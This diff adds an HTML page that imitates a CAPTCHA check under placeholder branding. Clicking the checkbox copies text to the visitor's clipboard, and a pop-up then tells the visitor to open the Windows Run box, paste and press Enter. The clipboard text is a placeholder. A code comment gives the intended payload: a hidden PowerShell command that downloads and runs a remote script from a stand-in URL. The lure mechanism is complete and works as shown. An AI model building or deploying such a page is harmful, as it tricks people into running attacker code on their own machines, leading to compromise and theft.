@@ -1,0 +1,259 @@
+<html>
+
+<style>
+	.check{
+	  top: 0;
+	  left: 0;
+	  height: 50px;
+	  width: 25px;
+	  background-color: #eee;
+	  margin-right: 2px;
+	}
+	.checkLabel{
+ 		margin-left: 10px;
+ 		text-align:center;
+ 		justify-content: center;
+	}
+	.container{
+		width: 20rem;
+		background-color:#fafafa;
+		border: 1px solid #e0e0e0;
+		border-width: 1px;
+		border-radius: 5px;
+		display:flex;
+		justify-content:center;
+		align-items:center;
+		padding:auto;
+		justify-content: space-between;
+		padding:10px;
+		
+	}
+	.verifyHumanBtn{
+		display:flex;
+		justify-content:center;
+		align-items:center;
+	}
+	h1{
+		font-size: 3rem;
+		font-weight:bold;
+		line-height: 3.75rem;
+	}
+	body{
+		width:100%;
+		max-width:60rem;
+		margin: 8rem auto;
+		padding-left: 1.5rem;
+		padding-right: 1.5rem;
+		font-family: system-ui;
+		display:flex;
+		flex-direction:column;
+		min-height: 70vh; /* set the height so the browser knows how high the window should be */ 
+	}
+	.main{
+		flex: 2;
+		display: flex;
+		flex-direction:column;
+	}
+	.spacer{
+		margin-top: 4rem;
+		font-size: 1.5rem;
+		line-height: 2.25rem;
+	}
+	h2{
+		font-weight:550;
+		font-size: 1.8rem;
+	}
+	.spacer-bottom{
+		margin-top: 0;
+		margin-bottom: 2.5rem;
+	}
+	.brandingContainer{
+		display:grid;
+		grid-template-rows: auto auto;
+		align-items:center;
+		text-align: center;
+		margin:0;
+	}
+	.brandingContainer  p {
+	    font-size: .75rem;
+	    margin: 2; /* Ensures no extra space around the paragraphs */
+	}
+	
+	.modal{
+		display: none;
+		position: fixed;
+		justify-content: center;
+		align-items:center;
+		z-index: 9999;
+		padding-top: 100px;
+		width: 100%;
+		height: 100%;
+		top: 0;
+		left: 0;
+		margin: auto auto;
+		background-color: rgba(0,0,0,0.1);
+	}
+	
+	.modalContent{
+		margin:auto auto;
+		margin-top:10vw;
+		background-color: #fefefe;
+		width:25rem;
+		border: 1px solid rgba(0,0,0,0.4);
+		overflow: hidden;
+		border-radius: 10px;
+  		box-shadow: 0px 20px 10px rgba(0, 0, 0, 0.1); /* Softer, lighter shadow */
+  		justify-content:center;
+	}
+	.innderH3{
+		text-align:center;
+		margin-top: 0px;
+		margin-bottom:25px;
+		font-weight: 500;
+		color: rgba(0,0,0,0.7);
+	}
+	
+	.modalInner{
+		padding: 20px;
+		display 
+  		justify-content:center;
+
+	}
+	li {
+  		margin-bottom:.5rem;
+	}
+	
+	.modalTop{
+		display:flex;
+		align-items:center;
+		text-align:center;
+		justify-content: center;
+		height: 4rem;
+		background-color:  #007BFF;
+		color: white;
+	}
+	.modalBottom{
+		display: flex;
+		justify-content: center;
+		align-items:center;
+		text-align:center;
+		padding-bottom: 1rem;
+		padding-right: 1rem;
+		height: 4rem;
+		color: white;
+	}
+	.buttonBottom{
+		border: 1px solid white;
+		border-radius: 4px;
+		padding: 1rem 2rem;
+		text-decoration:none;
+		left:0;
+		cursor: pointer;
+		/*background-color:#007BFF; #04AA6D*/
+		border:none;
+		font-weight: 500;
+		font-size: 1rem;
+		transition-duration: 0.5s; 
+		border: 2px solid #007BFF;
+	}
+	.buttonBottom:hover{
+		background-color: #007BFF;
+		color: white;
+	}
+	footer {
+		width: 100%;
+		max-width:60rem;
+		margin: 0 auto;
+		padding-right: 1.5rem;
+		font-size: .75rem;
+		line-height: 1.125rem;
+		margin-top: auto;
+	}
+	.footerInner {
+	 	border-top: 1px solid #d9d9d9;
+	 	padding-top: 1rem;
+	 	padding-bottom: 1rem;
+	}
+	
+
+	
+ </style>
+ <body >
+ 	<div class="main">
+	 	<h1 class="h1">www.COMPANY.com</h1>
+	 	<h2 class="spacer-bottom">Verify you are human by completing the action below.</h2>
+	 
+		 <div style="" class="container">
+		 	<div class="verifyHumanBtn" onclick="document.getElementById('popupModal').style.display='block'; copy()">
+			 	<input class="check" type="checkbox" id='capchaCheckBtn' name="verify-if-human" value="verified">
+			 	<label class="checkLabel" for="capchaCheckBtn"> Verify you are human </label><br>
+		 	</div>
+		 	
+		 	<div class="brandingContainer">
+		 		<h3 style="margin-bottom:0">💀</h3>
+		 		<div style="display:flex; gap:2px">
+					<p><a href="#">Privacy</a></p>
+					<p>/</p>
+					<p><a href="#">Terms</a></p>
+				</div>
+		 	</div>
+		 </div>
+		 <div class="spacer">
+		 	<p>www.COMPANY.com needs to review this security of your connection before proceeding.</p>
+		 </div>
+		 
+		 <div class="modal" id="popupModal">
+		 	<div class="modalContent">
+			 	<div class="modalTop">
+			 		<h3>Complete These Verification Steps</h3>
+			 	</div>
+		 		<div class="modalInner">
+		 			<h3 class="innderH3">Complete the following verification steps.</h3>
+				 	<ol>
+				 		<li>Press  & hold the windows key + <b>R</b></li>
+				 		<li>In the verification window, press <b>Ctrl + V</b></li>
+				 		<li>Press <b>Enter</b> on your keyboard.</li>
+				 		<li>Click <b>Verify</b> button below to finish.</li>
+				 	<ol/>
+			 	</div>
+			 	<div class="modalBottom">
+			 		<a class="buttonBottom" href="https://www.google.com">Verify</a>
+			 	</div>
+			 </div>
+		 </div>
+	</div>
+	<footer>
+		<div class="footerInner"></div>
+		<div style="margin-bottom:.5rem; text-align:center;">Ray ID: 0000000000</div>
+		<div style="text-align:center;">Performance & security by NO-ONE</div>
+	</footer>
+	<script>
+	
+		const checkbox = document.getElementById("capchaCheckBtn");
+		const modal = document.getElementById("popupModal")
+		checkbox.addEventListener("change", () => {
+			if (checkbox.checked){
+				modal.style.display = 'block';
+				checkbox.checked = true;
+			} else{
+				modal.style.display = 'none';
+			}
+		});
+
+		modal.addEventListener("click", (event) => {			
+			if (event.target === modal){
+				modal.style.display = 'none';
+      				checkbox.checked = false;
+			}
+		});
+		
+		function copy(){
+			var copiedTxt= "THIS IS A MALICIOUS PAYLOAD!!";
+			// powershell.exe -w hidden -command \ "iex (iwr 'https://<MALICIOUS GITHUB URL>/<FILE>').Contnet\" # \"✅ ''I am not a robot - reCAPTCHA Verification ID: 93752\""
+			navigator.clipboard.writeText(copiedTxt);
+		}
+
+	</script>
+
+ </body>
+</html>
